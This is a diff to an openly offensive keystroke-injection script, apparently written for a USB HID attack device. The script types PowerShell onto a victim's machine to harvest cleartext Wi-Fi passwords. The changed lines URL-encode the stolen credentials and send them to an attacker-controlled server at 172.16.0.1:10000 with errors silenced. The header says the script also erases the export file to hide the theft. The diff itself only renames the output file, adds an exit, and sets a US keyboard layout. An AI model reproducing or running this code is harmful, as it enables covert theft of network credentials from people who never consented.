@@ -1,5 +1,5 @@
 /*
-Exfiltrate Cleartext WLAN Passwords and earase export file after transmission
+Exfiltrate Cleartext Wifi Passwords and earase export file after transmission
 author: Klau5t4ler0x90
 
 Remeber: Befor script running, start pythonwesever on port 10000!
@@ -115,7 +115,7 @@ function getWlan() {
   type("  $encoded = [System.Web.HttpUtility]::UrlEncode($raw)\n");
   press("ENTER");
   delay(200);
-  type("  $url = 'http://172.16.0.1:10000/?datei=neu1.html&data=' + $encoded\n");
+  type("  $url = 'http://172.16.0.1:10000/?datei=wifi_creds.html&data=' + $encoded\n");
   press("ENTER");
   delay(200);
   type("  try { Invoke-WebRequest -Uri $url -UseBasicParsing } catch {}\n");
@@ -125,10 +125,12 @@ function getWlan() {
   press("ENTER");
   type("}\n");
   press("ENTER");
+  type("exit");
+  press("ENTER");
 }
 
 
-layout('de');			// US keyboard layout
+layout('us');			// US keyboard layout
 fast();
 
 startPS();
